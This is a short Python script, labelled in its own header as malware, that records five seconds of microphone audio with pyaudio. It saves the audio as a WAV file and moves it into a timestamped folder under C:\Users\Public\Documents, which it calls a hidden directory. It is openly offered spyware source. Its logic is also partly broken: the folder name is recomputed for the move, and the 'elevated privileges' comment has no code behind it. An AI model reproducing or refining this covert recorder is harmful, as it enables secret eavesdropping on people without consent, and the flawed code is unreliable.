# This malware will record the audio from your microphone and save it to a file

import pyaudio
import wave
import sys
import os
import time

# record audio from the microphone
def record_audio():
    # set the chunk size of 1024 samples
    chunk = 1024
    # sample format
    FORMAT = pyaudio.paInt16
    # mono, change to 2 if you want stereo
    channels = 1
    # 44100 samples per second
    sample_rate = 44100
    record_seconds = 5
    # name of .wav file
    file_name = "output.wav"
    # initialize PyAudio object
    audio = pyaudio.PyAudio()
    # open stream object as input & output
    stream = audio.open(format=FORMAT, channels=channels, rate=sample_rate, input=True, frames_per_buffer=chunk)
    # frames per second
    frames_per_second = int(sample_rate / chunk)
    print("Recording...")
    frames = []
    # loop through stream and append audio chunks to frame array
    for i in range(0, int(frames_per_second * record_seconds)):
        data = stream.read(chunk)
        frames.append(data)
    # stop and close stream
    stream.stop_stream()
    stream.close()
    # terminate pyaudio object
    audio.terminate()
    print("Finished recording.")
    # save audio file
    # open the file in 'write bytes' mode
    wave_file = wave.open(file_name, 'wb')
    # set the channels
    wave_file.setnchannels(channels)
    # set the sample format
    wave_file.setsampwidth(audio.get_sample_size(FORMAT))
    # set the sample rate
    wave_file.setframerate(sample_rate)
    # write the frames as bytes
    wave_file.writeframes(b''.join(frames))
    # close the file
    wave_file.close()

def main():
    # execute with elevated privileges in windows
    # record audio
    record_audio()
    # move the file to a hidden directory
    os.system('mkdir C:\\Users\\Public\\Documents\\' + str(time.time()))
    os.system('move output.wav C:\\Users\\Public\\Documents\\' + str(time.time()))
# execute the program
if __name__ == '__main__':
    main()